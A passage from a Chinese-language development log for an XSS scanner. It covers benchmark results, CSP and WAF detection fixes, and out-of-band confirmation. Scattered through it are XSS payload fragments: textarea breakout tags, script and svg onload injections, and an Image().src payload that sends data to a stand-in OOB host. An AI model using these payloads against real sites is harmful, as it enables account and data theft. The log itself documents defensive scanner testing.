| async | 60 | 0 | 34 | 4 | 0 | 0.938 | 1.000 | 0.000 | 526s |

sync 首次跑出**全绿**（旧基线有 6 个 safe 用例因 loopback 中断计 ERROR，从未真正评分）。async 的 4 个 FN（`neg-filter-05` / `pos-cdata-01` / `pos-tpl-01` / `pos-tpl-02`）单独复现**全部检出**（0.7–0.8s），仍是环境抖动。

两个引擎的 **1 + 5 个 FN 全部是环境抖动**（劣化 loopback 在满载下掐连接）：单独复现这 6 个用例**全部检出**（1.2–11.6s），且 sync 与 async 漏掉的用例集合完全不重叠——判定代码回归前必须先单跑复现。对照旧基线（`phase69_sync.json` / `phase68_async.json`，均为 recall/precision 1.000）时须注意：旧 sync 基线里 **6 个 safe 用例是 ERROR（从未真正评分）**，现在全部跑通为 TN；旧基线没暴露的 1 个 sync FP 与 3 个 async FP 已在 Phase 91/92 修掉（见下）。

**Phase 91/92：基准暴露的三个真实误报**（都可稳定复现，非环境问题）：
- `neg-escape-03`（sync+async）：Phase 84 放宽的 event_handler 回退正则把 `value='&#x27; onmouseover=alert(&#x27;TOK&#x27;)'` 当成真属性边界——引号被 html.escape 转成实体，浏览器里根本没跳出属性。改为 `_value_owner_attr()` 迷你 HTML tokenizer 走引号/未加引号值状态机；顺带修掉 `<img src=x/onerror=...>`（`/` 不终止未加引号值，lxml 实测 src 把它吞掉）。UTF-7 变换（`+ACY- onmouseover=...`）不含任何实体，也只有状态机能拦住。
- `neg-csp-01/03`（async）：`css_context` 分支（`<style>` 与 `style=`）完全没查 CSP，而 script_block / event_handler / url_javascript 都查了 → 严格 CSP 下仍确认可执行。已补闸门；`expression()`/`@import` 故意不放闸（那是 CSS，script-src 管不到）。
- `neg-escape-03`（async，url_javascript）：原闸门是"窗口内无实体"，UTF-7 类变换（`+ADw-iframe src=javascript:...`）零实体直接绕过。改为要求 sink 所属属性是 URI 类（href/src/content/...）。

**Phase 93：async 变慢的真正原因（推翻我此前 P85→P87→HEAD 的归因）**。cProfile 实测 `neg-escape-03`（23s）：扫描器自身只花 **0.33s**，**22.9s 停在 `GetQueuedCompletionStatus`——进程在睡觉，不在干活**。根因是 `AsyncScanner.jitter` 默认 **0.1**：与 sync 同名但语义完全不同——sync 的 jitter 是**限速间隔的比率**（不开 `--rate-limit` 就零开销），async 的却是**每个请求前固定睡 50–150ms**，而 `cli_runner.py` 两处构造都没传它，CLI 也没有开关能关掉（测试全都显式传 `jitter=0`，作者们早已在绕）。212 个请求 ≈ 21s，就是全部差距；传输本身实测 2.3ms/请求（keep-alive 与 force_close 无差别）。默认改 0.0（与 sync 对齐，限速改为显式 opt-in）后 `neg-escape-03` **23.3s → 0.47s**，async 全矩阵 **1525s → 526s**，反超 sync（809s）。同批把 sync 自 Phase 27-1 就有的"转义反射收敛"（3 载荷×2 变换、跳过反射画像三明治探针、跳过 WAF bypass 基座）移植进 async，三份 `_is_marker_escaped` 拷贝收敛为 `context.is_marker_escaped` 一份（对旧实现做 4 万随机输入差分，零行为变化）。

**Phase 94：层护栏（元修复落地）**。本次审计链路里所有"静默失效"（漏 import、契约错配）都是被宽 `except Exception` 在 DEBUG 级吞掉的——Phase 63 一次 AttributeError 让 async 静默丢掉全部 17 个页面层，Phase 84 漏 import 让 L9 参数挖掘"正常工作"实则什么都没做。现在：`core/layer_guard.py` 提供 `run_layer()`，**三个层分发器（22 个层调用点）全部挂上每层护栏**——一层失败不再杀死后续层；接线类异常（ImportError / NameError / UnboundLocalError / SyntaxError——这些永远不可能是目标的错）**升到 WARNING 并点名层**，其余（duck-typing / 形状探测里常见的 AttributeError / TypeError / KeyError）留在 DEBUG 免得狼来了；`BudgetExhausted` / `CircuitOpen` 照旧透传（预算停止是主动结束，不是层 bug）。async 的 `_drain_agen` 同步升级：`page_tasks` 改为 `(层名, agen)`，告警可定位到层；`scanner_crawl` 的 param_miner / js_miner 挖掘点同样接线告警。教训记录在案：护栏上线当天，作者自己重构分发调用时漏传 `scanner`，22 处 TypeError 全部被护栏静默吞掉——**这正是 TypeError 不能无脑升 WARNING 的原因，也是分发契约必须有测试锁住的原因**（`tests/test_layer_guard.py`，11 例）。

**Phase 95：反射画像驱动的转义收敛（Phase 27-1/93 判定失效的修复）**。给基准补上**请求数**记录（`evaluate_case` 提取报告顶层 `meta.requests`，`benchmark/req_stats.py` 分析分布）后立刻暴露两件事：① `scan_time_s` 在本机噪声达 **±25×**（同一用例 2s ↔ 77s，与请求数完全不相关——安全软件掐 loopback + Defender 扫子进程启动），**耗时列不能作为优化依据，请求数才是稳定度量**；② escaped 端点（`neg-escape-01` 等）照打 **203 请求全预算**——Phase 27-1 的 `is_marker_escaped` 检查 marker **邻居** 8 字符里有无实体，但纯字母数字 marker 回显在元素体里时邻居是页面自己的结构字符（`<div>` 的 `>` / `</div>` 的 `<`），服务端从不编码它们 → **判定在最典型的 escaped 端点上恒 False，收敛预算从未生效过**（Phase 93 的 async"修复"实则主要靠 jitter，判定本身同样失效）。修复分三层：**profile_reflection 窗口截断**（探针回显后的 `</div>` 结构标签把裸 `<`/`>` 污染进窗口被判 kept——截断到第一个 `<` 后跟字母/`/`/`!` 的结构标签起点）；**实体证据优先**（属性值场景里页面自己的闭合引号 `">` 落在窗口内，裸 `"` 抢答 kept——改为实体形态存在即判 encoded，裸字符仅在无实体痕迹时才算 kept）；**按上下文收敛表**（`PROFILE_CONVERGE_CRITICAL`：元素体/`<`、dq 属性/`"`、sq 属性/`'`、未引号属性/`>`——该上下文 breakout **必需**字符全部被**编码**（stripped 不算：剥除字符可被 %22/fullwidth 类变换还原，认 stripped 会引 FN）才收敛到 3 载荷×2 变换；url_href（`javascript:` 无需特殊字符）、script/comment/css/template 系（关键字符不在探针集）不进表，保守不收敛）。双引擎接线（sync `_prioritize_bases` 返回 profile 供二次判定；async 在 WAF bypass 前收敛并截断候选）。效果：`neg-escape-01/02` 203→41、`neg-attr-03` 203→41、`neg-escape-06` 203→70，全矩阵请求数 8087→7088；`neg-attr-01/02/04`（引号剥除）、`neg-jsonp`（script_block）、`neg-rcdata`（raw 反射）、`neg-csp-03`（nonce 非严格）仍 203 属**设计内保守**。全矩阵判定 TP64 FP0 TN34 FN0（1 个 timeout 单跑复现即 TP）；测试 66/66 文件全绿，新增 `tests/test_profile_convergence.py` 11 例；`test_phase33`/`test_phase35` 的 escaped fixture 改为**剥除型**（escaped 回显现在会收敛，剥除才对应"过滤器场景"的原测试意图）。工具：`benchmark/req_stats.py`（请求分布）、`benchmark/req_shape.py`（服务端视角请求形状）。

**Phase 96：RCDATA breakout 缺口（4 个基准"safe"实为真漏洞 + 引擎从没试过唯一可行的向量）**。收尾 Phase 95 时列的下一个候选是"rcdata 系 203 请求收敛"，量化前先做实验验证，结果直接推翻了前提：`neg-rcdata-01..04`（textarea/title/xmp）的 `_page`/`_page_raw` **都不转义**，实测 `</textarea><svg onload=alert(1)>` 四端点 **breakout 原样回显全部可行**——RCDATA 内直接注入惰性 ≠ 端点安全，闭合标签 breakout 是教科书级 OWASP 向量。CLI 全扫描 4 端点全报 0 finding（**真 FN**），定位链：**verifier 有完整 RCDATA 感知**（`_RCDATA_TAGS` + `_in_rcdata_raw` 向后扫描，Phase 35 注释明说"a genuine breakout AFTER the closing tag still confirms"，单测证实三种 breakout 回显全 confirmed=True）→ **确认链路完备，缺口 100% 在载荷选择层**：`data/payloads.json` 里没有任何 `</textarea>`/`</title>`/`</xmp>` 前缀载荷，引擎从不尝试。修复镜像 Phase 95 形状：`reflection_profile.detect_rcdata_tag()`（token 位置向后扫描未闭合 RCDATA 开标签，与 verifier 语义一致）→ profile 带 `rcdata_tag` 字段 → `surface_rcdata_breakouts()`（dict 版 sync / strs 版 async）取 top-4 候选前置 breakout 变体（payload_class=`rcdata_breakout`）。**sync 接线在 `_prioritize_bases` 之后外层**；async 初版误放进 `not full_reflection` 分支被测试抓住（raw 回显全字符 kept → full_reflection=True → 分支整个跳过 → breakout 零发送）——移到外层并用 `not marker_escaped` 防止收敛后重扩候选列表。**基准标注复核**：neg-rcdata-01..04 ground_truth safe→**vulnerable**（raw 回显下 breakout 可行即真 XSS），另加 4 个 `m_escape_rcdata_*` safe 孪生端点（neg-rcdata-05..08，html.escape 后直接注入与 breakout 双惰性，同时是 Phase 95 收敛在 RCDATA 场景的回归锚）。效果：4 端点 0→**4 findings（全部 high/high）**，请求 203→33-34/端点（breakout 变体命中即停）；verifier 零改动。测试：`test_profile_convergence.py` 11→**19 例**（detect 矩阵 / profile 字段 / dict+strs surfacing / sync+async raw echo 确认 / escaped 双路径预算回归）。

测试侧：**66 文件全绿**（2026-09-06 分文件跑法 842s）。新增 `tests/test_verifier_event_handler.py`（23 例）、`tests/test_verifier_uri_csp.py`（18 例）、`tests/test_async_escaped_convergence.py`（9 例）、`tests/test_layer_guard.py`（11 例）、`tests/test_profile_convergence.py`（19 例，Phase 95+96）、`test_verifier_uri_csp.py` 再补 5 例（Phase 98）共 **85 例**。

**Phase 96 基准新基线（102 用例标定口径 sync/async 14/12/90）**：sync **TP67 FP0 TN34 FN1**（recall 0.985 / precision 1.000 / f1 0.993，898s；FN1=pos-url-02 timeout，与 p95 相同）；async **TP62 FP0 TN34 FN6**（476s）——6 个 FN 全部集中在 260-366s 的 loopback 劣化窗口（WinError 10054 连墙），单跑复现 **6/6 全 TP**，有效口径 **TP68 FP0 TN34 FN0**。对照 p95（98 用例）：sync TP63→67、async TP62→有效 68，增量全部来自 rcdata 4 用例 TN→TP；**FP 保持双引擎 0**。请求数：全矩阵 sum 7088→**6548**（加 4 用例反降 540：rcdata raw 系 4×203→33-34，新增 4 个 escaped safe 各 41-42——Phase 95 收敛口径）；rcdata 系彻底退出 top-12 请求榜（榜内全部为 Phase 95 已核对的设计内保守用例）。结果：`benchmark/results/p96_sync.json` / `p96_async.json`。

**Phase 98：CSP nonce 覆盖 `'unsafe-inline'`（渗透实战形态实测抓到的系统性误报）**。从渗透视角做**形态矩阵实测**（不是代码清单复核）：构造 12 个真实世界高频形态（多处反射 ×5、JSON API、规则型 WAF、nonce CSP、DOM/hash sink、postMessage、双重 URL 编码、大小写过滤、Angular 表达式、RESTful 路径、CRLF），批量跑引擎检验实验室指标能否兑现。**10/12 检出**；多处反射 5/5 全过（靠 polyglot + Phase 96 breakout + 注释逃逸兜底——**该假设被证据否定，不是缺口**）；CRLF 0 finding 合理（头注入不属于 XSS）。唯一真缺口是 nonce CSP：现代应用主流写法 `script-src 'strict-dynamic' 'nonce-xxx' 'unsafe-inline'`，按 CSP Level 2+ **策略含 nonce/hash 时浏览器忽略 `'unsafe-inline'`**，裸内联脚本根本不执行；而 `verifier._csp_blocks_inline` 与 `csp.is_strict_inline` 两处都只做"`'unsafe-inline'` 存在即判可执行"，旧行为下靶场报出 `high/high` 而 PoC 永不触发的**系统性假阳性**。修复：`csp.unsafe_inline_overridden()`（script-src/default-src 含 nonce 或 sha256/384/512 源即判 unsafe-inline 失效；`'strict-dynamic'` 只影响 host 源，不计入）→ verifier 内联门接入。**Phase 36 nonce 泄漏利用不受影响**（携带策略声明 nonce 的脚本由 `_script_nonce_allowed` 放行，单测锁定不误杀）。实测效果：修复前确认载荷是裸 `<script>`（假阳性），修复后升级为 `<script nonce='页面真实 nonce'>`（**真实可利用**）——误报变成了真漏洞。测试：`test_verifier_uri_csp.py` 18→**23 例**。

**Phase 97：基准 FN 二次确认（把本轮手动 repro 6 个 FN 的流程自动化进 runner）**。`run_benchmark_batched.py` 现在对**形状像环境失败的 FN**（error 非空 / requests==0 / scan_time ≥ 0.9×timeout）自动复评一次：翻案则替换记录、首跑完整保留在 `fn_retry.first` 注记里（可审计，绝不静默丢弃）；复现仍 FN 或重试本身异常则如实保留 FN。**真代码 FN（正常完成、正常请求数、无 error）永不重试**——保留给人工判断，防止重试掩盖真实检测缺口。跨 run 对比须核对 `meta.fn_retry_on`（口径开关不同时 resume 会按 budget 变化丢弃旧结果，不静默混跑）。已验证：timeout=1 构造必现 FN 场景，触发→重试→仍 FN→注记保留全链路正确；`test_benchmark.py` 33/33 过。

**Phase 98：PoC 认证 header 回放（09-02 复审"PoC 回放会失败"的最后一块）**。`build_poc` 此前只回放 cookies——API 目标用 `Authorization: Bearer` / `X-API-Key` / 自定义反爬头认证时，无凭据 curl PoC 直接 401，客户/复测复现不了。现在 `--poc-auth` 开关语义扩展为"回放会话凭据（cookies **和** 可回放 headers）"：`attach_pocs`（sync + scanner_layers 镜像）取 `session.headers`，经 blocklist 过滤（host/content-length/content-type/connection/accept 系/cookie——cookie 走 `-b` 专道）后以 `-H` 逐条进 curl，含 header/cookie/path 三类 transport 载体 finding 分支；PoC dict 带 `replay_headers` 键供报告展示。默认仍 OFF（报告外发不泄露测试者会话）。测试 `tests/test_poc_replay_headers.py` 7 例（认证头入 curl、控制头过滤、POST+cookie+header 组合、transport 载体分支、无 headers 零变化、None 值剔除、upload 分支）。

**Phase 98b：async 路径的 PoC 凭据桥接（集成测试抓出的真缺口）**。async 引擎的 findings 经 `Scanner(requester=None)` shim 走报告链——该 shim 的 session 是**全新的空会话**，`attach_pocs` 读到的 cookies/headers 恒为空：**Phase 48 的 cookie 回放在 --async 模式下从未生效过，Phase 98 也会同样空转**。修复（cli_runner 两处 shim：单 URL + batch）：① 把 `asc.cookies`/`asc.headers`（CLI `-b`/`-H`/stealth UA 的真源）桥接进 shim 的 session；② shim 构造补传 `poc_include_auth`（此前开关也没传，闸门本身是关的）。附带修复：`AsyncScanner.__init__` 的 `asyncio.Lock()` 在 py3.9 于宿主环境（pytest/`--serve`/库嵌入）主线程隐式 loop 被消费时抛 RuntimeError——捕获后补建 loop 重试。新增集成测试 `test_async_cli_poc_replays_credentials`（真 CLI 参数 + 本地回显服务器 + 真 async 扫描，断言 PoC 同时含 `-b` 与 `-H`），8/8 过；全量回归 67/67 文件绿（1782s）。

**Phase 102：WAF 目标的端到端演练（此前零覆盖的实战主场景）**。大量真实目标在 Cloudflare/ModSecurity/Akamai 之后，`waf.py` 指纹与 `bypass.py` 厂商绕过链（Phase 91）都存在、扫描器见到 WAF 也会前置绕过变体，但**从未被整体验证过**。新增 `tests/test_waf_bypass_e2e.py`：伪 WAF 宣告自己（Server: cloudflare + CF-RAY + body 里的 Ray ID 注释）、403 掉两类朴素签名（`<script`、`<svg onload=`）、放行大小写/实体/UTF-7/unicode/`javascript:` 等形态。结论：**链路是通的**——引擎检出 Cloudflare → 走绕过链 → 命中确认（获胜载荷是 `<svg/onload=...>` 这类替代语法，而非被拦形态），对照组（无 WAF 头同一页面）正常。校准踩坑已写进文件注释：① 预算故意取小（4x3），满预算（~170 变体）在本机会偶发跑不到可确认变体而 flaky（曾出现 96s/128s 与零 finding）；② 若连 `onerror=`/`onload=` 一起拦（解码后大小写不敏感），目标比真实规则型 WAF 还硬，只有大预算能过——那测的是本机速度而非绕过逻辑。


**p103 基线（107 用例，Phase 103 口径）**：async **TP72 FP0 TN35 FN0**（f1=1.000，343s）——对比 p101 的 TP71/FN1，`neg-filter-06` 回归 TP、FN 归零。要说清楚的是：**这次跑动 fn_retry 一次都没触发**（环境正常、用例都是一次正常完成），所以 FN 归零主要来自环境本身，不能算 Phase 103 的功劳；Phase 103 的价值已由受控实验独立证明（同一慢度下 2s→FN / 30s→TP）。sync 那一轮撞上劣化窗口（30/107、耗时 23006s、FN15），结果已废弃不提交，改在环境恢复后重跑。

**p101 基线（107 用例，退避版 fn-retry）**：sync **TP72 FP0 TN35 FN0**（f1=1.000），async **TP71 FP0 TN35 FN1**；`pos-dom-04` 首次 FN 经退避重试翻案为 **TP**（机制在真实跑动中生效），async 的 `neg-filter-06` 三次尝试均为 timeout 但 `requests=91`（请求全发出、只是慢）而单跑 0.83s 即 TP——属本机"慢而非断"的性能噪声。结果文件 `benchmark/results/p101_sync.json` / `p101_async.json`。

**Phase 114b：同一家族第三例——DOM 层把 sink 自身当成了 taint source**。Phase 114 提交后的全量回归暴露 `test_benchmark_fp.py`（对全部 safe 用例断言**零 finding**，比基准判定器的类型过滤更严）失败：`neg-redirect-01` 的 `location.href = '/home';` 被 DOM 正则层报成 `medium` —— 窗口搜 source 时，**sink 匹配文本自身包含 `location`**（左值），于是每个 location 赋值都成了"由 location 喂养"。修法与 113b/114 同源：**把 sink 文本从 source 搜索窗口中掩掉，保留右值**（`location.href = location.hash.slice(1)` 的真来源在右值，不受影响）。验证：safe 双胞胎归零、vuln 双胞胎仍报 dom + open_redirect_xss；`tests/test_dom_source_fp.py` 4 例锁定。另：`test_benchmark_fp.py` 因 safe 用例增至 46 个、慢主机下超出 batched runner 的 540s 单文件预算而超时——`run_all_batched.py` 增加 per-file 超时 override（该文件作为 FPR 门禁获得 1800s）。

**三例同根因的完整记录**：redirect（113b）、service worker / web worker（114）、DOM regex（114b）——全部是"上下文窗口 + 关键词判定可控性，且不排除待判定语句自身"。凡写这类判定，先想清楚"窗口里出现的关键词是否就是待判定语句自己"。

**Phase 120：爬取类三层——`L9_form_miner` / `L9_js_miner` 用"行为"覆盖**。前几轮补的都是"层直接产出 finding"的用例；爬取层（表单发现 / JS 端点挖掘 / 参数挖掘）**不产 finding**，只做发现，所以这轮的用例是**行为性的**：landing 页**什么都不反射**、HTML 里也没有指向漏洞端点的链接——端点只存在于**表单 action**（或内联 JS 的 `fetch`）里。**不爬就找不到，找不到就不可能命中**。

- `pos-formmine-01`：landing `/r/crawl01` 不反射 → 表单 action 指向 `/r/formecho01`（原样回显）→ **TP**（163 请求，爬取确实发生了）
- `neg-formmine-01` / `pos-jsmine-01` / `neg-jsmine-01`（JS 端点同理）；另有 4 个 `aux-*` 用例让服务器提供被发现的端点本身（路由表来自 manifest）并单独计分

验证 **TP4 TN4 FP0 FN0**。为支撑这类用例给 runner 加了两项能力：`extra_args`（`--crawl` 是 opt-in）与 `finding_paths`（命中落在**被发现的端点**上，而不是 landing 页——否则判定器会把它当"不相关"记成 FN）。

**修正后：49 层中 37 已覆盖，12 未覆盖**（基准 153 用例）。

**Phase 121：`L9_param_miner` 隐藏参数覆盖——"参数本身是秘密"**。param_miner 对候选参数名逐个发探测请求（marker 反射 / 状态差 / 长度差 >50 即"interesting"），发现后把参数**合并进端点参数**喂给反射层——它自己是"使能型"层，不产 finding。用例设计：页面 HTML **没有任何** `name` 参数的线索（无表单字段、无链接、无内联 JS），manifest 用例钉 `param:""` 让扫描 URL 干净——扫描器唯一能学到 `name` 存在的途径就是 param_miner 探测（`name` 是候选表第 8 位，落在 max_payloads=14 ⇒ 14 候选的预算内）。

- `pos-pmmine-01`：`/r/pm01` 对 `?name=` 原样反射进 JS 双引号字符串（`var profile = "..."`)——miner 发现（marker 反射）→ 参数合并 → 反射层注入 `"></script><script>alert(...)` 确认 → **TP**（46 请求，探测量可见）
- `neg-pmmine-01`：`/s/pm01` 接受同一参数但只转义回显进文本节点（与 neg-formmine-01 同形状）——miner 同样报 interesting、反射层同样会来测，但转义输出无 finding → **TN**

实现细节：handler 注册在 `MODES_CTX`（不是 `PAGE_MODES`）——后者只能拿到钉死的单个参数值，`param:""` 时探测值永远到不了 handler；必须从 `ctx["query"]` 全量字典里读 `name`。`tests/test_param_miner_target.py` 锁死这个契约（含"只反射 `name`、忽略其他探测候选"——否则滚动反射率镜像保护会误触发终止挖掘）。验证 **TP1 TN1 FP0 FN0**；**49 层中 38 已覆盖，11 未覆盖**（基准 155 用例）。

**Phase 122：再补三层（`L7_css_injection` / `L1_pre_encoded` / `L2_position_shift`），并修掉第二个基准驱动的引擎缺陷（WAF 判定把指纹头当拦截证据）**。

- `L7_css_injection`：**Phase 116 的"该层在流程中不可能触发"结论被证伪**。当时的推导是"层收到的 marker 是参数名、注入流程产生不了触发它的请求"——但该层是**纯静态页面分析**（`analyze_page(html)`），而 `run_page_layers` 在**端点级无条件运行**（不依赖 marker 反射）。只要页面自身带违规 CSS（`@import url(https://evil.example/steal.css)`），层就会报 `css_import_injection=high`。用例 `pos/neg-cssi-01`（safe 双胞胎是自足样式）。
- `L1_pre_encoded`：容器型注入层。触发前提是**参数原值**被 `detect_structure` 识别为 json_b64/jwt 容器；payload 先打 token、再装回同款容器。runner 增加 `param_value` 覆盖字段，用例钉 `data=eyJwYWdlIjoicHJvZmlsZSJ9`（`{"page":"profile"}` 的 base64）。验证证据含 transform 链 `['pre_encode:json_b64']`。用例 `pos/neg-preenc-01`（mode `pe_vuln`/`pe_safe`——服务端宽松解码后反射原文，safe 全转义）。
- `L2_position_shift`：WAF 兜底层——top-3 payload 在原参数被拦时**换参数位置重发**。目标：POST body 参数被伪 WAF 拦（406），同值经 query 反射进 `<div id="search">` **无转义**——body 有 WAF、query 没有，position-shift 才有戏。用例 `pos/neg-pshift-01`。

**引擎缺陷（本轮真正的大鱼，家族第二例基准驱动）**：`waf.detect()` 用 `full_blob`（headers+body）搜 `_BLOCK_BODY_HINTS`，而 hints 里有 `cf-ray|cloudflare` 形态——**伪 WAF 的指纹响应头自己命中了自己**：所有 WAF 站**未拦截的 200 响应**被判成 blocked → `_try_payload` 全部 continue → **凡带 WAF 指纹的站点，所有 payload 确认静默失效**（无声漏报生成器，pos-pshift-01 的 227 请求零确认就是它）。修法：block-page hints 是 **body 信号**，两处 `full_blob` → `body_excerpt`；`tests/test_waf_detect_block_hints.py` 6 例锁定（未拦截 200 + 指纹头 ≠ blocked、真 block 页面 body → blocked、强状态码恒 blocked 等）。与 Phase 119（marker 边界）同源：**基准不只测"能不能检出"，还在抓"确认管线自相矛盾"的缺陷**。

**Phase 124：`L5_blind_oob` 覆盖（真实的带外回连确认，不需要浏览器）**。盲打 OOB 是"最高标准"基线里最有分量的一条，此前一直挂在"需 OOB 监听器"上——但这层其实**已经有自建监听器**（`xssentinel/core/oob.py` 的 `SelfHostedListener`，`--oob self`，token 走 URL path），真正缺的是**一个会让回调真的被加载的目标**。

难点在于浏览器：通常要有"受害者客户端"才会去取那个 URL。本轮把这一步建模掉了——目标是个**链接展开/图片代理**形态的应用，它会解析提交内容并解析真实元素所引用的资源。关键是这个展开器必须**基于 HTML 解析器**，而不是"全文正则扫 http(s) URL"：否则转义后的 safe 双胞胎（文本里照样含有回调 URL）也会回连，这个用例就什么都证明不了。

中途踩到一个必须写下来的坑：我最初只解析 `src`/`href` 属性，结果 `pos-blind-01` 判 **FN**——引擎真正用的第一个 blind 载荷是 `<script>new Image().src='https://__OOB__/?c='+...</script>`，**回调 URL 藏在内联 JS 文本里，不在任何属性上**。修法是让展开器同时看三个位置：真实元素的资源类属性、**事件处理器属性**（`onload=` 等）、以及**真实 `<script>` 元素的文本内容**；**纯文本节点一律忽略**——这正是让转义版保持沉默的那条界线。

验证（三重口径）：① 目标层面直接用引擎真实载荷打一发：vuln 回连成功 / safe 不回连；② 基准口径 **TP1 TN1**，且 pos 的 finding 类型是查出来的 **`blind`**（high/high），`extra_args` 带 `--oob self`；③ 零 finding 门禁这次**必须挂真监听器**否则 blind 层根本不跑——结果为 0。
**修正后：49 层中 43 已覆盖，6 未覆盖**（L4_second_order、L7_mutation、L7_time_based、L8_cookie_tossing、L7_xsleak、L9_scenario）。

**Phase 125：`L7_time_based` 覆盖（CSP 兜底通道），并修掉第四个基准驱动的引擎缺陷——这一层从来没能确认过任何东西**。

这层的定位是"严格 CSP 挡住了 alert() 时的兜底"：标准载荷全部无法确认后，改用资源加载型载荷（`<style>@import>`、`<img src>`、`onerror=fetch()`）带 `tb_` token 打出去，再看 OOB 监听器有没有收到。类型名 **`time_based_xss`** 从代码查得。

目标（`pos/neg-tb-01`）：原样反射 + **`script-src 'none'`**（注意**不能**用 `default-src 'none'`——那会把这一层赖以工作的图片/CSS 也一起禁掉，自相矛盾）+ Phase 124 那套"受害者解析并加载资源"的替身。转义版双胞胎自然沉默。

写用例时发现 `pos-tb-01` 判 **FN**，逐层取证：目标层面手工打三种通道**全部回连**；SPY 显示引擎**确实发出了**这些载荷（服务端日志可见 `<style>@import url('http://127.0.0.1:8915/tb_17bd8bd1/tb_17bd8bd1')`）；但监听器收到的 token 集合里**一个 `tb_` 都没有**。根因：**全仓库只有 `_inject_blind` 会 `oob.start()`**，而 `scan_time_based` 从不启动监听器——载荷是在监听器还没起来的时候发出去的，那一刻它只是个没人听的端口，回连被拒，于是**静默什么都不报**。更糟的是它有隐蔽的顺序依赖：只有当 blind 层"碰巧"先跑过并启动了监听器时，这层才可能工作；而 blind 有自己的"响应里要有原样可执行标签"门槛，很多场景根本不会跑。**一个看起来实现完整、却永远无法确认的能力**——与 Phase 122 的 WAF 判定、Phase 123 的转义判定同一家族。

修法（`time_xss.scan_time_based`）：发载荷**之前**确保监听器已启动（照 `_inject_blind` 的写法；对没有生命周期方法的简易监听器保持宽容）。附带修掉一处潜伏陷阱：`SelfHostedListener.callback_url()` 返回的 URL **已含 token**，而 `build_timing_payloads()` 又拼一次，实际发出去的是 `/<token>/<token>`——对当前"取路径第一段"的解析无害，但只要哪个监听器改成取最后一段就会立刻失效。`tests/test_time_xss.py` 新增 4 例锁定（启动必须早于首次发送、只启动一次、无生命周期监听器仍可扫、路径 token 不重复）。

**修正后：49 层中 44 已覆盖，5 未覆盖**（L4_second_order、L7_mutation、L8_cookie_tossing、L7_xsleak、L9_scenario）。验证 **TP1 TN1 FP0 FN0**。

**Phase 126：`L4_second_order` 覆盖——"在 A 注入、在 B 执行"的两页流程**。

这层检测的是经典二阶（stored）形态：输入在端点 A 落库，**在另一个页面 B 上执行**；A 与 B 是两页，且 B 由 CLI 显式给出或爬取发现（`--second-order-inject/-viewers/-param/-method`），finding 类型 **`second_order`**。目标直接复用仓库里已验证的 stored 机制（A 存、B 渲染），但只给这对孪生**自己的 mode 名**（`so2_write`/`so2_write_escaped`/`so2_view`），这样 manifest 能自解释、覆盖矩阵也能把 `L4_stored` 与 `L4_second_order` 分开——真正让它成为"二阶"的是 **A→B 这条流程**，不是 handler。

靶场侧只做两件小事：`load_routes()` 用**独立键** `second_order_view_path` 注册 B 页路由（若复用 `view_path` 会顺带触发 `--stored-inject` 流程，两个能力搅在一起），runner 把它翻成二阶 CLI 参数（显式 viewers，不靠爬取，保证确定性）。safe 双胞胎只改一处：A 存**转义后的值**，于是 B 渲染出来是文本、没有可执行上下文。

写用例时踩到一个**静默 FN**，值得记下来：我最初把 viewer 注册在 `PAGE_MODES`，结果 B 页永远渲染空 store、`pos-so2-01` 判 FN，而目标手工打两步却是对的。根因在 GET 派发顺序——`ctx_handler = MODES_CTX.get(mode) or POST_MODES.get(mode)`，只有前两者失配时才回退到 `PAGE_MODES`，而**回退分支传的是空 ctx `{}`**；viewer 拿不到 `ctx["path"]` 就无法解析 `VIEW_TO_INJECT`，于是静默渲染空列表（`stored_view` 一直注册在 POST_MODES，就是这个道理）。已把 viewer 移到 ctx 感知的注册表，并加 `tests/test_second_order_target.py` 5 例锁死：**viewer 模式必须在 ctx 感知表里**、两对孪生不共享 store、raw/escaped 两侧行为正确。

**修正后：49 层中 45 已覆盖，4 未覆盖**（L7_mutation、L8_cookie_tossing、L7_xsleak、L9_scenario）。基准 170 用例，验证 **TP1 TN1 FP0 FN0**。

**Phase 127：`L9_scenario` 覆盖（声明式多步场景），并修掉第五个基准驱动的引擎缺陷——按官方文档写场景的人一直在静默漏报**。

`L9_scenario` 是"用 JSON 配方描述多步流程"的能力（Nuclei 风格）：step 1 把带 token 的载荷 POST 到写入端点，step 2 GET 读取端点并在响应里做语义确认；确认后发 `type="scenario"`（high/high）。步骤路径是**站点级**的（按 origin 解析，不受被扫页面路径影响）。用例 `pos/neg-scn-01` 复用二阶那套"两页"目标，区别只在于**流程由数据驱动，而不是专用 CLI 标志**；两个孪生用不同参数名（`comment` / `note`）保证每次扫描只跑自己那条场景。`scenario_file` 由 runner 按**项目根目录**拼成绝对路径（`_invoke_scanner` 不设 `cwd=`，相对路径会随调用方所在目录漂移）。

**发现的缺陷**：`pos-scn-01` 首跑判 FN。SPY 抓到场景那一步实际发出的字段名叫 **`{param}`**——`{param}` 占位符只在 `path` 和 `payload` 里被展开，**步骤的字段名没有展开**（`fname = str(st.get("param", param))`）。而模块自己的文档示例恰恰写的是 `"param": "{param}"`：于是载荷被 POST 到一个字面名叫 `{param}` 的字段上，应用什么都没存，读取端自然查不到 token，**场景永远无法确认且一声不响**。既有测试全用字面量 `"param": "q"`，所以从来没碰到这条路径。修法是补上 `.replace("{param}", param)`，`tests/test_scenarios.py` 新增 1 例用**文档写法**锁定。

另外两件小事：① `data/scenarios.example.json`——`--scenarios` 的帮助文本一直指向它，而它**根本不存在**，已补（含 `{param}` 说明与"路径按 origin 解析"的坑）。② `load_routes()` 里"注册渲染页"的逻辑出现第三次，抽成 `_register_viewer`；**这次抽取我自己写错了一处**——`key.replace("_view_path", "_view_mode")` 对 `view_path`（无前导下划线）静默失配，导致 stored 的渲染页 mode 被填成了路径字符串。是 Phase 126 加的那条结构断言把它当场抓住的（**测试的价值就在这儿**），已改为显式键映射表。

**修正后：49 层中 46 已覆盖，3 未覆盖**（L7_mutation、L8_cookie_tossing、L7_xsleak）。基准 172 用例，验证 **TP1 TN1 FP0 FN0**。

**Phase 128：`L7_xsleak` + `L7_mutation` 覆盖，并修掉第六个基准驱动的引擎缺陷（mXSS 确认路径同样是转义盲的）——覆盖到 48/49，只剩本地不可行的那一层**。

两组用例：
- `pos/neg-xs-01`（`L7_xsleak`）：这层是**响应头面审查**（需 `--audit-xs-leaks` 开关，不是常开）：页面**完全没有**跨源隔离（COOP/CORP/COEP）也没有框架限制（X-Frame-Options / CSP frame-ancestors）时才报 `xs_leak_surface`；任一硬化头在场即静默。孪生只差一个 `X-Frame-Options: DENY`。**注意它的严重度是 low**——常规零 finding 门禁（只看 high/medium）**抓不住**这层的回归，所以安全孪生必须**带着开关**验证（脚本里单列了这一步）。
